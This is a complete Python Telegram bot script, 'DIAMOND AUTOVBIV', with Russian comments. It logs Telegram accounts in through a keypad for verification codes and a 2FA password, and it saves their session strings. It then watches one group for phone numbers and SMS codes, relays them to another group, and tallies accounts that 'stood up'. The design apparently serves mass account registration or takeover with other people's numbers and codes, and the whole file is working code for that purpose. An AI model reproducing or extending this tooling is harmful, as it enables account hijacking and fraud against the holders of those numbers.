# diamond_autovbiv.py
# FIXED BUTTONS - КНОПКИ РАБОТАЮТ

import os
import asyncio
import re
import sqlite3
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon.tl.custom import Button

# ========== КОНФИГ ==========
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

SESSION_DIR = os.environ.get("SESSION_DIR", "/app/sessions")
os.makedirs(SESSION_DIR, exist_ok=True)

DB_PATH = "/app/diamond_data.db"

if not API_ID or not API_HASH or not BOT_TOKEN:
    print("❌ Ошибка: Установите переменные в Railway")
    print("API_ID, API_HASH, BOT_TOKEN")
    exit(1)

# ========== БАЗА ДАННЫХ ==========
class DiamondDB:
    def __init__(self):
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                user_id INTEGER PRIMARY KEY,
                phone TEXT,
                session_string TEXT,
                step TEXT,
                created_at TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS groups (
                user_id INTEGER PRIMARY KEY,
                source_group INTEGER,
                target_group INTEGER
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                code TEXT,
                status TEXT,
                created_at TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                action TEXT,
                timestamp TIMESTAMP
            )
        ''')
        self.conn.commit()
    
    def save_session(self, user_id, phone, session_string, step):
        self.cursor.execute('''
            INSERT OR REPLACE INTO sessions (user_id, phone, session_string, step, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, phone, session_string, step, datetime.now()))
        self.conn.commit()
    
    def get_session(self, user_id):
        self.cursor.execute('SELECT session_string, phone, step FROM sessions WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        return row if row else (None, None, None)
    
    def set_groups(self, user_id, source_group, target_group):
        self.cursor.execute('''
            INSERT OR REPLACE INTO groups (user_id, source_group, target_group)
            VALUES (?, ?, ?)
        ''', (user_id, source_group, target_group))
        self.conn.commit()
    
    def get_groups(self, user_id):
        self.cursor.execute('SELECT source_group, target_group FROM groups WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        return row if row else (None, None)
    
    def add_pending_number(self, user_id, phone):
        self.cursor.execute('''
            INSERT INTO pending (user_id, phone, status, created_at)
            VALUES (?, ?, 'waiting_code', ?)
        ''', (user_id, phone, datetime.now()))
        self.conn.commit()
        return self.cursor.lastrowid
    
    def update_pending_with_code(self, phone, code):
        self.cursor.execute('''
            UPDATE pending SET code = ?, status = 'code_received'
            WHERE phone = ? AND status = 'waiting_code'
        ''', (code, phone))
        self.conn.commit()
    
    def mark_success(self, phone):
        self.cursor.execute('''
            UPDATE pending SET status = 'success' WHERE phone = ? AND status = 'code_received'
        ''', (phone,))
        self.conn.commit()
    
    def add_stat(self, user_id, phone, action):
        self.cursor.execute('''
            INSERT INTO stats (user_id, phone, action, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (user_id, phone, action, datetime.now()))
        self.conn.commit()
    
    def get_stats_today(self, user_id):
        today = datetime.now().replace(hour=0, minute=0, second=0)
        self.cursor.execute('''
            SELECT action, COUNT(*) FROM stats 
            WHERE user_id = ? AND timestamp >= ?
            GROUP BY action
        ''', (user_id, today))
        return dict(self.cursor.fetchall())
    
    def get_last_pending_number(self, user_id):
        self.cursor.execute('''
            SELECT phone FROM pending 
            WHERE user_id = ? AND status = 'waiting_code' 
            ORDER BY created_at DESC LIMIT 1
        ''', (user_id,))
        row = self.cursor.fetchone()
        return row[0] if row else None

db = DiamondDB()

# ========== ОСНОВНОЙ БОТ ==========
bot = None
user_clients = {}
user_code_inputs = {}  # {user_id: {'code': '123', 'phone': '+7999...', 'msg_id': None}}

# ========== КЛАВИАТУРА ==========
def get_code_keyboard():
    return [
        [Button.inline("1", b"1"), Button.inline("2", b"2"), Button.inline("3", b"3")],
        [Button.inline("4", b"4"), Button.inline("5", b"5"), Button.inline("6", b"6")],
        [Button.inline("7", b"7"), Button.inline("8", b"8"), Button.inline("9", b"9")],
        [Button.inline("0", b"0"), Button.inline("⌫", b"del"), Button.inline("✅ ПОДТВЕРДИТЬ", b"submit")]
    ]

# ========== ОБРАБОТЧИКИ ==========
async def setup_handlers():
    global bot
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(event):
        await event.reply("""
💎 **DIAMOND AUTOVBIV BOT** 💎

/login <номер> — вход в аккаунт
/set_source — отметить группу с номерами и кодами
/set_target — отметить группу для отправки и "встал"
/stats — статистика
/status — статус
/reset — сброс
        """)
    
    @bot.on(events.NewMessage(pattern='/login (.+)'))
    async def login_cmd(event):
        user_id = event.sender_id
        phone = event.pattern_match.group(1).strip()
        
        await event.reply(f"📱 Отправляю код на {phone}...")
        
        session_path = os.path.join(SESSION_DIR, f"temp_{user_id}")
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        try:
            await client.send_code_request(phone)
            user_clients[user_id] = client
            db.save_session(user_id, phone, "", "waiting_code")
            
            # Сохраняем информацию о вводе
            user_code_inputs[user_id] = {'code': '', 'phone': phone}
            
            # Отправляем сообщение с кнопками
            sent = await event.reply(
                f"✅ Код отправлен на {phone}\n\n🔢 **Введите код через кнопки:**\n\nТекущий код: ` `",
                buttons=get_code_keyboard()
            )
            user_code_inputs[user_id]['msg_id'] = sent.id
            
        except Exception as e:
            await event.reply(f"❌ Ошибка: {str(e)}")
    
    @bot.on(events.CallbackQuery())
    async def callback_handler(event):
        user_id = event.sender_id
        data = event.data.decode('utf-8')
        
        # Проверяем, есть ли пользователь в процессе ввода
        if user_id not in user_code_inputs:
            await event.answer("❌ Сначала используйте /login", alert=True)
            return
        
        current_code = user_code_inputs[user_id]['code']
        phone = user_code_inputs[user_id]['phone']
        
        # Обработка цифр
        if data.isdigit():
            user_code_inputs[user_id]['code'] += data
            new_code = user_code_inputs[user_id]['code']
            await event.answer(f"Код: {new_code}")
            
            # Обновляем сообщение
            try:
                await event.edit(
                    f"✅ Код отправлен на {phone}\n\n🔢 **Введите код через кнопки:**\n\nТекущий код: `{new_code}`",
                    buttons=get_code_keyboard()
                )
            except:
                pass
        
        # Обработка удаления
        elif data == 'del':
            user_code_inputs[user_id]['code'] = current_code[:-1]
            new_code = user_code_inputs[user_id]['code']
            await event.answer("Удалено")
            
            try:
                await event.edit(
                    f"✅ Код отправлен на {phone}\n\n🔢 **Введите код через кнопки:**\n\nТекущий код: `{new_code}`",
                    buttons=get_code_keyboard()
                )
            except:
                pass
        
        # Обработка подтверждения
        elif data == 'submit':
            code = user_code_inputs[user_id]['code']
            if not code:
                await event.answer("❌ Введите код!", alert=True)
                return
            
            await event.answer(f"⏳ Проверяю код {code}...")
            
            client = user_clients.get(user_id)
            if not client:
                await event.edit("❌ Сессия потеряна. Используйте /login заново")
                del user_code_inputs[user_id]
                return
            
            try:
                await client.sign_in(code=code)
                session_string = client.session.save()
                user_phone = (await client.get_me()).phone
                db.save_session(user_id, user_phone, session_string, "authorized")
                
                await event.edit(f"✅ **Вход выполнен!**\n\nАккаунт: {user_phone}\n\nТеперь настройте группы:\n/set_source — группа с номерами и кодами\n/set_target — группа для отправки")
                del user_code_inputs[user_id]
                
            except SessionPasswordNeededError:
                db.save_session(user_id, phone, "", "waiting_2fa")
                await event.edit(f"🔐 **Требуется 2FA пароль**\n\nИспользуйте: `/2fa <пароль>`")
                del user_code_inputs[user_id]
                
            except Exception as e:
                await event.edit(f"❌ Ошибка: {str(e)}\n\nПопробуйте /login заново")
                del user_code_inputs[user_id]
    
    @bot.on(events.NewMessage(pattern='/2fa (.+)'))
    async def twofa_cmd(event):
        user_id = event.sender_id
        password = event.pattern_match.group(1).strip()
        
        _, _, step = db.get_session(user_id)
        client = user_clients.get(user_id)
        
        if not client or step != "waiting_2fa":
            await event.reply("❌ Сначала используйте /login")
            return
        
        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            phone = (await client.get_me()).phone
            db.save_session(user_id, phone, session_string, "authorized")
            await event.reply(f"✅ **Вход выполнен!**\n\nАккаунт: {phone}")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {str(e)}")
    
    @bot.on(events.NewMessage(pattern='/set_source'))
    async def set_source_cmd(event):
        user_id = event.sender_id
        source_group = event.chat_id
        _, target_group = db.get_groups(user_id)
        db.set_groups(user_id, source_group, target_group)
        await event.reply(f"✅ **ГРУППА ИСТОЧНИК установлена!**\n\nID: {source_group}")
    
    @bot.on(events.NewMessage(pattern='/set_target'))
    async def set_target_cmd(event):
        user_id = event.sender_id
        target_group = event.chat_id
        source_group, _ = db.get_groups(user_id)
        db.set_groups(user_id, source_group, target_group)
        await event.reply(f"✅ **ГРУППА ЦЕЛЬ установлена!**\n\nID: {target_group}")
        
        # Запускаем слушатель для источника
        session_string, _, _ = db.get_session(user_id)
        if session_string and source_group:
            client = await get_user_client(user_id, session_string)
            if client:
                asyncio.create_task(start_source_listener(user_id, client, source_group))
    
    @bot.on(events.NewMessage(pattern='/stats'))
    async def stats_cmd(event):
        user_id = event.sender_id
        stats = db.get_stats_today(user_id)
        msg = f"📊 **СТАТИСТИКА ЗА СЕГОДНЯ**\n\n"
        msg += f"📱 Номеров: {stats.get('number_taken', 0)}\n"
        msg += f"🔢 Кодов: {stats.get('code_taken', 0)}\n"
        msg += f"✅ Успешно: {stats.get('success', 0)}"
        await event.reply(msg)
    
    @bot.on(events.NewMessage(pattern='/status'))
    async def status_cmd(event):
        user_id = event.sender_id
        _, phone, _ = db.get_session(user_id)
        source_group, target_group = db.get_groups(user_id)
        msg = f"⚙️ **СТАТУС**\n\n"
        msg += f"👤 Аккаунт: {phone or '❌'}\n"
        msg += f"📥 Источник: {source_group or '❌'}\n"
        msg += f"📤 Цель: {target_group or '❌'}"
        await event.reply(msg)
    
    @bot.on(events.NewMessage(pattern='/reset'))
    async def reset_cmd(event):
        user_id = event.sender_id
        if user_id in user_clients:
            await user_clients[user_id].disconnect()
            del user_clients[user_id]
        db.cursor.execute('DELETE FROM sessions WHERE user_id = ?', (user_id,))
        db.cursor.execute('DELETE FROM groups WHERE user_id = ?', (user_id,))
        db.conn.commit()
        await event.reply("✅ Сброшено. Используйте /login")
    
    # ========== ЛОГИКА ПЕРЕХВАТА ==========
    async def get_user_client(user_id, session_string=None):
        if user_id in user_clients:
            client = user_clients[user_id]
            if client.is_connected():
                return client
        
        if not session_string:
            session_string, _, _ = db.get_session(user_id)
            if not session_string:
                return None
        
        session_path = os.path.join(SESSION_DIR, f"user_{user_id}")
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        client.session.set_session_str(session_string)
        
        if await client.is_user_authorized():
            user_clients[user_id] = client
            return client
        return None
    
    async def start_source_listener(user_id, client, source_group_id):
        """Слушаем группу-источник"""
        
        @client.on(events.NewMessage(chats=source_group_id))
        async def handle_source(event):
            if event.sender_id == (await client.get_me()).id:
                return
            
            text = event.raw_text.strip()
            
            # Номер телефона
            phone_match = re.search(r'(\+?\d{10,15})', text)
            if phone_match:
                phone = phone_match.group(1)
                db.add_pending_number(user_id, phone)
                db.add_stat(user_id, phone, 'number_taken')
                
                _, target_group = db.get_groups(user_id)
                if target_group:
                    await client.send_message(target_group, f"📱 **НОМЕР:** `{phone}`")
                print(f"📱 Номер: {phone}")
            
            # Код
            code_match = re.search(r'\b(\d{4,8})\b', text)
            if code_match and not phone_match:
                code = code_match.group(1)
                last_phone = db.get_last_pending_number(user_id)
                
                if last_phone:
                    db.update_pending_with_code(last_phone, code)
                    db.add_stat(user_id, last_phone, 'code_taken')
                    
                    _, target_group = db.get_groups(user_id)
                    if target_group:
                        await client.send_message(target_group, f"🔢 **КОД:** `{code}` для `{last_phone}`")
                    print(f"🔢 Код: {code} для {last_phone}")
    
    # Слушаем "встал" в целевой группе
    @bot.on(events.NewMessage())
    async def handle_target(event):
        user_id = event.sender_id
        _, target_group = db.get_groups(user_id)
        
        if not target_group or event.chat_id != target_group:
            return
        
        text = event.raw_text.lower()
        
        if 'встал' in text or 'успех' in text:
            phone_match = re.search(r'(\+?\d{10,15})', text)
            if phone_match:
                phone = phone_match.group(1)
                db.mark_success(phone)
                db.add_stat(user_id, phone, 'success')
                await event.reply(f"✅ **{phone} — ВСТАЛ!**")

# ========== ЗАПУСК ==========
async def main():
    global bot
    print("💎 DIAMOND AUTOVBIV BOT")
    print(f"📡 API_ID: {API_ID}")
    
    bot = TelegramClient(os.path.join(SESSION_DIR, "main_bot"), API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    
    await setup_handlers()
    print("✅ Бот запущен! Кнопки должны работать.")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
